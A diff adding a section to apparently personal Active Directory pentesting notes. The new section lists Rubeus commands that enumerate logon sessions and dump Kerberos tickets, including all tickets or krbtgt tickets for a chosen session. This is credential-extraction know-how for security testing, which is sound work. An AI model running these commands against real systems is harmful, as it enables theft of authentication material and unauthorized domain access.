@@ -70,6 +70,20 @@ See [[AS-REP Roasting]]
 #### Kerberoasting
 
 See [[Methodology/Active Directory/Kerberoasting|Kerberoasting]]
+
+#### Extracting Tickets
+
+Ticket Extraction
+```powershell
+# Enumerate logon sessions and associated tickets
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+# Extracting tickets
+C:\path\Rubeus.exe dump /nowrap  # extract ALL tickets
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<luid> /service:<svc (krbtgt, ldap, etc)> /nowrap # extract specific tickets
+```
+
 #### ADCS
 See [[AD CS Attacks]]
 
